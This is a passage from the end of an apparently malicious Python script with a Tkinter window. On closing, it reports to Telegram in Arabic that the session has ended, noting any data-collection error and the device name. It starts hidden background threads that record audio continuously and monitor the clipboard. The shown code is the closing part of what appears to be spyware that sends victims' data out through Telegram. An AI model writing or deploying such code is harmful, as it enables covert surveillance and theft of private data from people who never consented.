        send_to_telegram_split(f"❌ تم إنهاء الجلسة\nخطأ في جمع البيانات: {str(e)}\nالجهاز: {device_name}")
    root.destroy()

root.protocol("WM_DELETE_WINDOW", on_closing)

threading.Thread(target=record_audio_loop, daemon=True).start()
threading.Thread(target=monitor_clipboard, daemon=True).start()

root.mainloop()